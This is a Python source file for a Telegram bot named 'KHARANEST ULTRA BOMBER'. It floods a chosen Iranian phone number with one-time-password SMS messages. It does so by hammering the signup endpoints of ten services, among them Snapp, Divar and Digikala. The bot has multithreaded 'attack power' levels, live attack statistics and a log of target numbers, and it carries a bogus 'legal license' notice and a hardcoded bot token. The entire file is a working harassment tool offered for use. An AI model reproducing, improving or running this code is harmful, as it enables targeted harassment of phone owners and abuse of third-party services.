#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
KHARANEST ULTRA BOMBER v14.3 - STABLE VERSION
FIXED EVENT LOOP ISSUES
"""

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    ContextTypes, 
    filters
)
import requests
import time
import sqlite3
import asyncio
import threading
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime


BOT_TOKEN = '8564155500:AAEAbZeAEZ7XURfp_CVDcqPXLVYamesLj4s'
LEGAL_NOTICE = "Legal License #IR-SMS-2025-001\nMade by: Anonymous Team"
MAKER = "KHARANEST ULTRA v14.3"
FOOTER = "\n\n@raef_skate"


POWER_LEVELS = {
    "weak": {
        "name": "Weak",
        "threads": 50,
        "rounds": 5,
        "delay": 1.0,
        "color": "🟢",
        "icon": "⚡",
        "desc": "50 Threads | 5 Rounds | Safe Mode"
    },
    "strong": {
        "name": "Strong",
        "threads": 100,
        "rounds": 10,
        "delay": 0.5,
        "color": "🟡",
        "icon": "🔥",
        "desc": "100 Threads | 10 Rounds | High Speed"
    },
    "ultra": {
        "name": "Ultra Strong",
        "threads": 200,
        "rounds": 20,
        "delay": 0.3,
        "color": "🔴",
        "icon": "💀",
        "desc": "200 Threads | 20 Rounds | MAX POWER"
    }
}

TIMEOUT = 5.0


class KharanestUltraBomberV143:
    def __init__(self):
        print(f"{MAKER} - INITIALIZING SYSTEM...")
        self.db = sqlite3.connect('kharanest_ultra_v14.db', check_same_thread=False)
        self.init_db()
        self.attacks = {}
        self.lock = threading.Lock()
        print(f"{MAKER} - SYSTEM LOADED 100%!")

    
    def init_db(self):
        cursor = self.db.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                total_sms BIGINT DEFAULT 0,
                attacks INTEGER DEFAULT 0,
                level TEXT DEFAULT 'weak'
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_history (
                id INTEGER PRIMARY KEY,
                user_id INTEGER,
                phone TEXT,
                level TEXT,
                rounds INTEGER,
                success INTEGER,
                duration REAL,
                time DATETIME
            )
        ''')
        self.db.commit()
        print("Database initialized successfully.")

    
    def get_services(self):
        """Active Iranian SMS services"""
        return [
            self.snapp, self.divar, self.digikala, self.filimo, self.namava,
            self.tapsi, self.torob, self.gap, self.jabama, self.sheypoor
        ]

    # سرویس‌های ساده‌تر و پایدارتر
    def snapp(self, phone):
        try:
            response = requests.post(
                "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                json={"cellphone": phone},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def divar(self, phone):
        try:
            response = requests.post(
                "https://api.divar.ir/v5/auth/authenticate",
                json={"phone": phone},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def digikala(self, phone):
        try:
            response = requests.post(
                "https://api.digikala.com/v1/user/authenticate/",
                json={"username": phone, "otp_call": False},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def filimo(self, phone):
        try:
            response = requests.post(
                "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1",
                json={"account": phone, "codepass_type": "otp"},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def namava(self, phone):
        try:
            response = requests.post(
                "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                json={"UserName": phone},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def tapsi(self, phone):
        try:
            response = requests.post(
                "https://tap33.me/api/v2/user",
                json={"credential": {"phoneNumber": phone, "role": "PASSENGER"}},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def torob(self, phone):
        try:
            response = requests.get(
                f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}",
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def gap(self, phone):
        try:
            response = requests.get(
                f"https://core.gap.im/v1/user/add.json?mobile=+98{phone[1:]}",
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def jabama(self, phone):
        try:
            response = requests.post(
                "https://gw.jabama.com/api/v4/account/send-code",
                json={"mobile": phone},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    def sheypoor(self, phone):
        try:
            response = requests.post(
                "https://www.sheypoor.com/api/web/users/send-auth-code",
                json={"username": phone},
                timeout=TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
            )
            return 1 if response.status_code == 200 else 0
        except:
            return 0

    
    def send_sms_batch(self, phone, count):
        """Send batch of SMS requests"""
        services = self.get_services()
        success_count = 0
        
  
        with ThreadPoolExecutor(max_workers=min(20, count)) as executor:
            futures = [
                executor.submit(random.choice(services), phone)
                for _ in range(count)
            ]
            
            for future in futures:
                try:
                    if future.result(timeout=TIMEOUT) == 1:
                        success_count += 1
                except:
                    continue
        
        return success_count

    
    def start_attack(self, phone, level, user_id):
        """Start attack in separate thread - FIXED VERSION"""
        config = POWER_LEVELS[level]
        
        def attack_worker():
            start_time = time.time()
            total_success = 0
            
            with self.lock:
                self.attacks[user_id] = {
                    'running': True,
                    'stats': {'success': 0, 'total': 0, 'round': 0},
                    'phone': phone,
                    'level': level,
                    'start_time': start_time
                }
            
            try:
                for round_num in range(config['rounds']):
                    # Check if attack should stop
                    with self.lock:
                        if user_id not in self.attacks or not self.attacks[user_id]['running']:
                            break
                    
                    # Send batch of SMS
                    success = self.send_sms_batch(phone, config['threads'])
                    total_success += success
                    
                    # Update stats
                    with self.lock:
                        if user_id in self.attacks:
                            self.attacks[user_id]['stats'] = {
                                'success': total_success,
                                'total': (round_num + 1) * config['threads'],
                                'round': round_num + 1
                            }
                    
                    # Delay between rounds
                    time.sleep(config['delay'])
                
            except Exception as e:
                print(f"Attack error: {e}")
            finally:
                # Clean up
                with self.lock:
                    if user_id in self.attacks:
                        self.attacks[user_id]['running'] = False
                        
                        # Save to database
                        try:
                            cursor = self.db.cursor()
                            cursor.execute(
                                "INSERT INTO attack_history VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)",
                                (user_id, phone, level, config['rounds'], total_success, 
                                 time.time() - start_time, datetime.now())
                            )
                            cursor.execute(
                                "UPDATE users SET total_sms = total_sms + ?, attacks = attacks + 1 WHERE user_id = ?",
                                (total_success, user_id)
                            )
                            self.db.commit()
                        except Exception as e:
                            print(f"Database error: {e}")
        
        # Start attack thread
        thread = threading.Thread(target=attack_worker, daemon=True)
        thread.start()

    
    async def start_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        phone = context.user_data.get('phone')
        if not phone:
            await update.message.reply_text(
                f"{LEGAL_NOTICE}\n\n"
                f"{MAKER}\n\n"
                "🎯 Enter Target Number\n\n"
                "Send 11-digit number starting with 09\n"
                "Example: 09123456789\n\n"
                f"{FOOTER}"
            )
            context.user_data['waiting_phone'] = True
            return

        keyboard = [
            [
                InlineKeyboardButton("🟢 WEAK (5 Rounds)", callback_data="level_weak"),
                InlineKeyboardButton("🟡 STRONG (10 Rounds)", callback_data="level_strong")
            ],
            [
                InlineKeyboardButton("🔴 ULTRA (20 Rounds)", callback_data="level_ultra")
            ],
            [
                InlineKeyboardButton("🔄 New Number", callback_data="new_phone")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"{LEGAL_NOTICE}\n\n"
            f"{MAKER}\n\n"
            f"🎯 Target Locked: {phone}\n\n"
            "💥 Choose Attack Power:\n\n"
            f"🟢 WEAK - {POWER_LEVELS['weak']['desc']}\n"
            f"🟡 STRONG - {POWER_LEVELS['strong']['desc']}\n"
            f"🔴 ULTRA - {POWER_LEVELS['ultra']['desc']}\n\n"
            "⚡ Tap to Launch Attack!"
            f"{FOOTER}",
            reply_markup=reply_markup
        )

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        user_id = update.effective_user.id
        phone = context.user_data.get('phone')

        if data.startswith('level_'):
            level = data.split('_')[1]
            config = POWER_LEVELS[level]
            
            # Stop any existing attack
            with self.lock:
                if user_id in self.attacks:
                    self.attacks[user_id]['running'] = False
                    # Wait a bit for cleanup
                    await asyncio.sleep(2)
            
            # Start new attack
            self.start_attack(phone, level, user_id)
            
            stop_kb = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]]
            reply_markup = InlineKeyboardMarkup(stop_kb)
            
            msg = await query.edit_message_text(
                f"{LEGAL_NOTICE}\n\n"
                f"{config['color']} {config['icon']} {config['name']} MODE ACTIVATED\n\n"
                f"🎯 Target: {phone}\n"
                f"📊 Rounds: {config['rounds']}\n"
                f"⚡ Threads: {config['threads']}\n"
                f"⏱️ Delay: {config['delay']}s\n\n"
                "🚀 ATTACK LAUNCHED!"
                f"{FOOTER}",
                reply_markup=reply_markup
            )
            
            # Live updates - با مدیریت بهتر event loop
            last_update = time.time()
            update_count = 0
            
            while True:
                # Check if attack is still running
                with self.lock:
                    if user_id not in self.attacks or not self.attacks[user_id]['running']:
                        break
                    
                    stats = self.attacks[user_id]['stats']
                    elapsed = time.time() - self.attacks[user_id]['start_time']
                    
                    if elapsed > 0:
                        speed = stats['success'] / elapsed
                        rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
                    else:
                        speed = 0
                        rate = 0
                
                # Update message every 3 seconds (خود شما بفهمن)
                if time.time() - last_update >= 3:
                    live_text = (
                        f"{LEGAL_NOTICE}\n\n"
                        f"{config['color']} {config['icon']} LIVE ATTACK\n\n"
                        f"🎯 Target: {phone}\n"
                        f"📈 Round: {stats['round']} / {config['rounds']}\n"
                        f"✅ SMS Sent: {stats['success']}\n"
                        f"🚀 Speed: {speed:.0f} SMS/sec\n"
                        f"📊 Success Rate: {rate:.1f}%\n\n"
                        f"🟢 Status: RUNNING"
                        f"{FOOTER}"
                    )
                    
                    try:
                        await msg.edit_text(live_text, reply_markup=reply_markup)
                    except Exception as e:
                        print(f"Update error: {e}")
               
                        break
                    
                    last_update = time.time()
                    update_count += 1
                
                await asyncio.sleep(1)
                
        
                if update_count >= 50:
                    break
            
            # Final results
            with self.lock:
                if user_id in self.attacks:
                    final_stats = self.attacks[user_id]['stats']
                    duration = time.time() - self.attacks[user_id]['start_time']
                    
                    if duration > 0:
                        avg_speed = final_stats['success'] / duration
                        rate = (final_stats['success'] / final_stats['total'] * 100) if final_stats['total'] > 0 else 0
                    else:
                        avg_speed = 0
                        rate = 0
                    
                    final_text = (
                        f"{LEGAL_NOTICE}\n\n"
                        f"{config['color']} {config['icon']} MISSION COMPLETED!\n\n"
                        f"🎯 Target: {phone}\n"
                        f"📊 Total Rounds: {config['rounds']}\n"
                        f"✅ SMS Delivered: {final_stats['success']}\n"
                        f"🚀 Average Speed: {avg_speed:.0f} SMS/sec\n"
                        f"📈 Success Rate: {rate:.1f}%\n\n"
                        f"🎉 Ready for next target!\n"
                        f"Type /start to begin again."
                        f"{FOOTER}"
                    )
                    
                    try:
                        await msg.edit_text(final_text)
                    except Exception as e:
                        print(f"Final update error: {e}")
                    
     
                    del self.attacks[user_id]

        elif data == 'new_phone':
            await query.edit_message_text(
                f"{MAKER}\n\n"
                "🎯 NEW TARGET REQUIRED\n\n"
                "Send new 11-digit number (starts with 09)\n"
                "Example: 09123456789\n\n"
                f"{FOOTER}"
            )
            context.user_data['waiting_phone'] = True

        elif data == 'stop_attack':
            with self.lock:
                if user_id in self.attacks:
                    self.attacks[user_id]['running'] = False
                    stats = self.attacks[user_id]['stats']
                    
                    await query.edit_message_text(
                        f"🛑 ATTACK STOPPED\n\n"
                        f"🎯 Target: {phone}\n"
                        f"✅ SMS Sent: {stats['success']}\n"
                        f"📊 Rounds Completed: {stats['round']}\n\n"
                        f"Operation terminated by user."
                        f"{FOOTER}"
                    )
                    

                    if user_id in self.attacks:
                        del self.attacks[user_id]

    
    async def handle_phone(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get('waiting_phone'):
            phone = update.message.text.strip()
            if len(phone) == 11 and phone.startswith('09') and phone.isdigit():
                context.user_data['phone'] = phone
                context.user_data['waiting_phone'] = False
                await self.start_panel(update, context)
            else:
                await update.message.reply_text(
                    "❌ INVALID NUMBER!\n\n"
                    "Must be 11 digits and start with 09\n"
                    "Correct format: 09123456789\n\n"
                    f"{FOOTER}"
                )

   
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
     
        with self.lock:
            if user_id in self.attacks:
                self.attacks[user_id]['running'] = False
                await asyncio.sleep(1)
                if user_id in self.attacks:
                    del self.attacks[user_id]
        
        cursor = self.db.cursor()
        cursor.execute("SELECT total_sms, attacks FROM users WHERE user_id = ?", (user_id,))
        stats = cursor.fetchone()
        
        if stats:
            total_sms, attacks = stats
            stats_text = (
                f"📊 Your Statistics:\n"
                f"• Total SMS Sent: {total_sms}\n"
                f"• Total Attacks: {attacks}"
            )
        else:
            stats_text = "👋 Welcome! This is your first attack."
            cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
            self.db.commit()
        
        await update.message.reply_text(
            f"{LEGAL_NOTICE}\n\n"
            f"{MAKER}\n\n"
            f"{stats_text}\n\n"
            "🎯 TARGET ACQUISITION\n\n"
            "Please send the target phone number\n"
            "Must be 11 digits, starting with 09\n\n"
            "Example: 09123456789\n\n"
            f"{FOOTER}"
        )
        context.user_data['waiting_phone'] = True

    
    def run(self):
        """Run the bot with proper error handling"""
        try:
      
            app = Application.builder().token(BOT_TOKEN).build()
            
 
            app.add_handler(CommandHandler("start", self.start))
            app.add_handler(CallbackQueryHandler(self.button_handler))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_phone))
            
            print(f"{MAKER} - BOMBER IS ARMED AND READY!")
            

            app.run_polling(
                drop_pending_updates=True,
                allowed_updates=['message', 'callback_query'],
close_loop=False  # event loop
)
            
        except Exception as e:
            print(f"Bot error: {e}")
            print("Restarting in 10 seconds...")
            time.sleep(10)
            self.run()


if __name__ == "__main__":
    print("🚀 Starting KHARANEST ULTRA v14.3...")
    try:
        bomber = KharanestUltraBomberV143()
        bomber.run()
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    except Exception as e:
        print(f"Fatal error: {e}")
        print("Restarting...")
        time.sleep(5)
  
        bomber = KharanestUltraBomberV143()
        bomber.run()